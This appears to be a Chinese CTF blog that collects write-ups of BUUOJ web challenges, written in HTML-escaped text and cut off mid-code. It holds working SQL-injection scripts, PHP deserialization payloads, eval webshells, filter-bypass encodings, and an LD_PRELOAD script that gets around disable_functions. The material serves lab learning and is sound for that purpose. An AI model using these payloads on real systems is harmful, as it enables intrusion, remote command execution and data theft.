get_flashed_messages.__globals__[&#39;current_app&#39;].config [0CTF 2016]piapiapia进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到www.zip备份文件 访问一下register.php注册个账户就可以登录了 再看其他的内容 profile.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; $username &#x3D; $_SESSION[&#39;username&#39;]; $profile&#x3D;$user-&gt;show_profile($username); if($profile &#x3D;&#x3D; null) &#123; header(&#39;Location: update.php&#39;); &#125; else &#123; $profile &#x3D; unserialize($profile); $phone &#x3D; $profile[&#39;phone&#39;]; $email &#x3D; $profile[&#39;email&#39;]; $nickname &#x3D; $profile[&#39;nickname&#39;]; $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;])); ?&gt; class.php &lt;?php require(&#39;config.php&#39;); class user extends mysql&#123; private $table &#x3D; &#39;users&#39;; public function is_exists($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;); $value_list &#x3D; Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username &#x3D; parent::filter($username); $new_profile &#x3D; parent::filter($new_profile); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125; &#125; class mysql &#123; private $link &#x3D; null; public function connect($config) &#123; $this-&gt;link &#x3D; mysql_connect( $config[&#39;hostname&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;] ); mysql_select_db($config[&#39;database&#39;]); mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123; $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;; $result &#x3D; mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key &#x3D; implode(&#39;,&#39;, $key_list); $value &#x3D; &#39;\\&#39;&#39; . implode(&#39;\\&#39;,\\&#39;&#39;, $value_list) . &#39;\\&#39;&#39;; $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape &#x3D; array(&#39;\\&#39;&#39;, &#39;\\\\\\\\&#39;); $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;; $string &#x3D; preg_replace($escape, &#39;_&#39;, $string); $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; public function __tostring() &#123; return __class__; &#125; &#125; session_start(); $user &#x3D; new user(); $user-&gt;connect($config); update.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123; $username &#x3D; $_SESSION[&#39;username&#39;]; if(!preg_match(&#39;&#x2F;^\\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;])) die(&#39;Invalid phone&#39;); if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;])) die(&#39;Invalid email&#39;); if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10) die(&#39;Invalid nickname&#39;); $file &#x3D; $_FILES[&#39;photo&#39;]; if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000) die(&#39;Photo size error&#39;); move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;])); $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;]; $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;]; $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;]; $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]); $user-&gt;update_profile($username, serialize($profile)); echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;; &#125; else &#123; ?&gt; config.php &lt;?php $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;; $config[&#39;username&#39;] &#x3D; &#39;root&#39;; $config[&#39;password&#39;] &#x3D; &#39;&#39;; $config[&#39;database&#39;] &#x3D; &#39;&#39;; $flag &#x3D; &#39;&#39;; ?&gt; profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile); 所以再根据 $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; 可以进行反序列化字符逃逸 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 这里这个过滤可以利用抓包将nickename改成数组类型来绕过 看一下这个your profile页面 看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag [MRCTF2020]PYWebsite进去后看源码，有一段js脚本 试了一下这个md5，能解出来但是是付费记录 所以直接看flag.php “除了购买者和我自己” 那就试试127.0.0.1本地访问 [极客大挑战 2019]FinalSQL盲注，注入点在id 可以利用异或来进行盲注 找个脚本直接爆破，学一下这个脚本 import requests import sys import time def get_DBlen(url): for i in range(1,10): db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: print(&quot;数据库名称的长度为:%d&quot;%i) return i def get_DBname(url,length): DBname &#x3D; &quot;&quot; length &#x3D; length + 1 for i in range(1,length): Max &#x3D; 122 Min &#x3D; 41 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max &#x3D; Mid-1 Mid &#x3D; (Min+Max)&#x2F;&#x2F;2 pass pass DBname &#x3D; DBname + chr(Mid) print(DBname) return DBname def get_TBname(url): name&#x3D;&quot;&quot; i &#x3D; 0 while True: i &#x3D; i+1 Max &#x3D; 128 Min &#x3D; 32 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 爆字段名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 获取flag db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max&#x3D;Mid-1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass pass name&#x3D;name+chr(Mid) print(name) if Mid &#x3D;&#x3D; 31: break time.sleep(0.5) if __name__&#x3D;&#x3D;&quot;__main__&quot;: url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot; db_Len &#x3D; get_DBlen(url) db_Name &#x3D; get_DBname(url,db_Len) tb_name &#x3D; get_TBname(url) [NPUCTF2020]ReadlezPHP 跳到time.php?source界面看看内容 反序列化构造实现命令执行 system这里应该是过滤了，可以用assert代替 assert()简介：判断一个表达式是否成立。返回true or false。 当参数为字符串时，会被当作php代码执行。 例如 assert(&quot;phpinfo()&quot;) &lt;&#x3D;&#x3D;&gt; &lt;?phpinfo()?&gt; assert与eval的区别 assert把整个字符串参数当php代码执行，eval把合法的php代码执行。 payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;} 或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo 搜索flag就能找到 [CISCN2019 华东南赛区]Web11xff头的ssti注入，我好像之前做过一个差不多的 界面右上角ip可随意改变，因此可以利用readfile函数读flag [BJDCTF2020]EasySearch扫目录，发现index.php.swp界面 要让password前六位md5值为6d0bc1 爆破一下 登录后抓包 这里可以看见一个shtml页面 进入后的页面 这里admin的位置是我们的用户名，这里利用了ssl注入 SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入 模板就类似于 可以先用ls查看目录找到flag文件，再利用cat查看 访问页面找到flag [BSidesCF 2019]Futurellaf12源码里有flag 好久没做这么简单的了 [网鼎杯 2020 朱雀组]Nmap常见的nmap命令 nmap linux 命令 在线中文手册 (51yip.com) 选项 解释-oN 标准保存-oX XML保存-oG Grep保存-oA 保存到所有格式-append-output 补充保存文件选项-oG将结果Grep保存。 nmap -F -oG test.txt 192.168.23.11选项-oA该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。 nmap -F -oA test 192.168.3.2 这里就是要用nmap的 -oN命令写shell &#39; -oN w4ke.txt &#39; 返回host maybe down之后访问w4ke.txt 所以可以试试写个一句话木马上去 &#39; -oN b.txt &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39; 返回了hacker，所以应该是有东西被过滤了 试了一下发现是php被过滤了 可以用其他的进行替代 &lt;?&#x3D;eval($_POST[a]);?&gt; 利用post传参执行命令 参考链接 网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客 网鼎杯 2020 朱雀组]Nmap (icode9.com) [强网杯 2019]高明的黑客根据题目提示下载压缩包文件，里面存在三千多个php文件 每一个文件里都有shell，我们要找到一个能用的 import requests import os import re url &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39; path &#x3D; r&#39;C:\\Users\\ethe\\Desktop\\www\\src&#39; ptn_get &#x3D; re.compile(br&quot;\\$_GET\\[&#39;(\\w+)&#39;\\]&quot;) ptn_res &#x3D; re.compile(br&#39;success_hack&#39;) count &#x3D; 0 for f in list(os.scandir(path)): print(str(f)[11:-2]) count +&#x3D; 1 with open(f.path, &#39;rb&#39;) as fp: data &#x3D; fp.read() for get in set(ptn_get.findall(data)): get &#x3D; get.decode(&#39;utf-8&#39;) cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39; r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;) if ptn_res.search(r.content) is not None: print(f.name, get) exit() [NCTF2019]True XML cookbook题目提示xml，抓包后 猜应该是有xxe注入，直接上payload，发现没读取成功 看一看dologin.php的源码 &lt;?php &#x2F;** * autor: c0ny1 * date: 2018-2-7 *&#x2F; $USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å· $PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç  $result &#x3D; null; libxml_disable_entity_loader(false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); try&#123; $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); $username &#x3D; $creds-&gt;username; $password &#x3D; $creds-&gt;password; if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username); &#125;else&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage()); &#125; header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;); echo $result; ?&gt; 但是从这个源码里也找不到flag 后边就是我看不懂的操作了 访问proc/net/arp文件查看有无可利用内网主机 尝试访问一下这个ip，报错 之后c段扫描，找到flag [CISCN2019 华北赛区 Day1 Web2]ikun这题感觉有点问题 写脚本找lv6 找到后 很明显钱不够 这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向 接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin 但是直接在url栏修改会要求用户是admin 这就要求修改jwt的cookie 认识JWT - 废物大师兄 - 博客园 (cnblogs.com) 这里的c-jwt-crack工具不会用，所以就跳过这部分吧 看登录后的源码看见www.zip路径 下载压缩包后发现全为python文件 这里是利用了python反编译 pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。 p = pickle.loads(urllib.unquote(become)) urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为： （1）pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （2）pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。 （3）pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 （4）pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法： 全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法 1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。 这里采用reduce 当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填 百度个脚本 把这个值给become里放包就行 参考链接 Python魔法方法指南_宇宙浪子的专栏-CSDN博客 Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com) 几天之后的补，jwt那个工具环境弄好了 [MRCTF2020]套娃才发现这就是寒假那个招新赛的原题 下划线可以用.来绕过，第二个if可以利用%0a换行绕过 要求本地登录 抓包改xff 里面有一段js代码 post一个merak值，得到一段代码 代码审计 要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day 可以用data://text/plain,绕过 也可以用data://text/plain;base64, 然后存在一个file_get_contents读取传入的file 要让这个值经过change函数后为flag.php 传进去，拿flag [极客大挑战 2019]RCE ME&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code); &#125; else&#123; highlight_file(__FILE__); &#125; &#x2F;&#x2F; ?&gt; 有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过 取反 成功执行 这里可以看到禁用的函数 或者利用异或 code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 一样可以进入phpinfo页面 查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马 //抄的payload ?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); &#x2F;&#x2F;别忘了后面的分号 或者： ?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) 然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag 但是 disable_functions禁用的函数太多导致shell不能执行命令 这里可以用蚁剑的插件（蚁剑yyds 还有一种方法 利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE参考链接：https://www.anquanke.com/post/id/175403 无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户 EXP地址 我看不懂，但我大受震撼 上传bypass.php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;; $cmd &#x3D; $_GET[&quot;cmd&quot;]; $out_path &#x3D; $_GET[&quot;outpath&quot;]; $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;; putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量 $so_path &#x3D; $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path); &#x2F;&#x2F;加载恶意动态库 mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。 echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;; unlink($out_path); ?&gt; 最终payload http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so 参考链接 bypass_disable_functions | 0xCreed (jxustctf.top) [BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com) 极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客 极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过 [BSidesCF 2019]Kookie 不知道密码，sql注入也不成功 直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。 [WUSTCTF2020]颜值成绩查询布尔盲注，过滤了空格 (ascii(substr(database(),{},1))={})&quot;.format(i,j) (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={}) (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={}) (ascii(substr((select(group_concat(value))from(flag)) 脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot; data &#x3D; &#39;&#39; k &#x3D; 0 for i in range(13,50): k &#x3D; 0 for j in range(43,127): gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j) res &#x3D; requests.get(url+gets) if &quot;your score is: 100&quot; in res.text: data +&#x3D; chr(j) print(data) k &#x3D; 1 break if(k &#x3D;&#x3D; 0): print(&quot;err!&quot;) exit() 因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了 一定是buu flag太长了（ 算是第一次自己写脚本了 遍历属实跑的太慢了，抽空学一下二分法的写法 flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4} [GWCTF 2019]枯燥的抽奖 涉及了php的伪随机 如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的 查看源码找到check.php pbEzqyRCJP &lt;?php #这不是抽奖程序的源代码！不许看！ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123; if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;; &#125; &#125; show_source(&quot;check.php&quot;); 知道前几位了 根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的 str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; str2&#x3D;&#39;ENxxxZwNwR&#39; str3 &#x3D; str1[::-1] length &#x3D; len(str2) res&#x3D;&#39;&#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] &#x3D;&#x3D; str1[j]: res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39; break print(res) 放到php_mt_seed里跑种子 再利用这个脚本得到最后的值 &lt;?php mt_srand(499600072); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; echo $str; ?&gt; 吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱 官网下的爆不出seed，从这里下的可以Index of /pub/projects/php_mt_seed (openwall.net) 还有就是一样的种子在php版本不一样的时候出来的值也不一样 [Zer0pts2020]Can you guess it?&lt;?php include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; $secret &#x3D; bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125; &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt; &lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt; &lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞 它会忽略后面的[\\x80-\\xff]范围内的字符串，即非ascii字符。例子如下： php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\\x80&quot;));&#39; &#x2F;&#x2F; config.php php -r &#39;print(basename(&quot;\\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php $_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。 [CISCN2019 总决赛 Day2 Web1]Easyweb源码泄露 下载image.php.bak &lt;?php include &quot;config.php&quot;; $id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;; $path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;; $id&#x3D;addslashes($id); $path&#x3D;addslashes($path); $id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id); 